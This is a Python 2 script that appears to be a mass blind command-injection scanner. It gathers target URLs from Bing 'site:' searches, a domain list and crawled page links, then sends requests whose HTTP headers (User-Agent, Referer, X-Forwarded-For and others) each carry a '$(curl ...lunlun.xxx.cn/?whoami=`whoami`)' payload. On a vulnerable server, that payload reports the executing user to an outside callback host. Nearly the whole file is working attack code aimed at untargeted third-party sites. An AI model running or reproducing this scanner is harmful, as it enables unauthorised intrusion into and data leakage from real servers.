#coding=utf-8


import urllib2
import sys
import re

class dnslog:
    def __init__(self):
        self.http=['http://','https://']
        self.payload={'User-Agent':"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"}

    def dnspayload(self,qq):
        payload={'User-Agent':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'Referer':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'True-Client-IP':'$(curl %s.xxx.wyzxxz.cn/?whoami=`whoami`)' % qq,
                 'X-Real-IP':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'Client-IP':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'X-Forwarded-For':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'X-Client-ip':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'Proxy':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'From':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'X-Wap-Profile':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq,
                 'Contact':'$(curl %s.lunlun.xxx.cn/?whoami=`whoami`)' % qq}
        return payload

    def dns_log(self,url):
        dns_url=urllib2.Request(url,headers=self.dnspayload(url))
        DNS_log=urllib2.urlopen(dns_url,timeout=0.5)
        print DNS_log.read()

    def bing(self,id):
        url="https://cn.bing.com/search?q=site%3a"+sys.argv[2]+"&first="+str(id).strip()+"&FORM=PERE"
        bing_url=urllib2.Request(url,headers=self.payload)
        bing_url_U=urllib2.urlopen(bing_url,timeout=1)
        bing_url_UQ=bing_url_U.read()
        bing_re=re.compile(r'">.+?<cite>(.+?)<strong>(.+?)<\/strong>',re.DOTALL)
        bing_re_Q=re.findall(bing_re,bing_url_UQ)
        for bing_reCQ in bing_re_Q:
            try:
                bing_uc="http://"+bing_reCQ[0].strip()+bing_reCQ[1]
                print bing_uc
                bing_UrlCQ=urllib2.Request(bing_uc,headers=self.dnspayload(bing_uc))
                bing_reurl=urllib2.urlopen(bing_UrlCQ,timeout=0.5)
                print bing_reurl.read()
            except Exception:
                pass

    def re_log(self,url):
        dns_url=urllib2.Request(url,headers=self.payload)
        dns_log=urllib2.urlopen(dns_url,timeout=0.5)
        dnsurl=dns_log.read()
        re_dns=re.compile(r'href="(.+?)"/.+?')
        re_url=re.findall(re_dns,dnsurl)
        for re_urlc in re_url:
            try:
                url_dns=urllib2.Request(re_urlc,self.dnspayload(re_urlc))
                url_dnsq=urllib2.urlopen(url_dns,timeout=0.5)
                print url_dnsq.read()
            except Exception:
                pass


    def dnsfuzz(self):
        for url in open(sys.argv[2],'r'):
            for http in self.http:
                try:
                    print http+url.strip()
                    self.dns_log(http+url.strip())
                    self.re_log(http+url.strip())
                except Exception:
                    print "NO"

    def bing_for(self):
        for id in range(1000):
            try:
                self.bing(id*8)
            except Exception:
                pass
